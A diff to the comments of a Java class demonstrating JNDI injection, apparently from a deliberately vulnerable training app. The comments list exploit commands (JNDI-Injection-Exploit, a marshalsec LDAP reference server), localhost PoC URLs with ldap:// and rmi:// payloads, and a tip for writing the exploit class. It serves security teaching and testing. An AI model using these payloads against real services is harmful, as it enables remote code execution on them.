@@ -32,8 +32,9 @@ public class JNDIInject {
      * @payload-1 java -jar JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar -C "open -a Calculator" -A 127.0.0.1
      * @payload-2 java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer http://127.0.0.1:65500/\#Exploit
      *
-     *
      * @poc-ldap http://127.0.0.1:28888/JNDI/vul?content=ldap://127.0.0.1:1389/Object
+     *
+     * 注意：编写exp的时候，一定要注意不要带package！！！
      * @poc-rmi http://127.0.0.1:28888/JNDI/vul?content=rmi://127.0.0.1:1099/RCE
      *
      * 注意：默认注册时配置，ldap 1389端口，rmi 1099端口；
@@ -73,6 +74,12 @@ public class JNDIInject {
         }
     }
 
+    /**
+     * @poc http://127.0.0.1:28888/JNDI/safe2?content=rmi://127.0.0.1:1099/RCE
+     *
+     * @param content
+     * @return
+     */
     @GetMapping("/safe2")
     public String safe2(String content){
         // 白名单过滤，匹配放行。
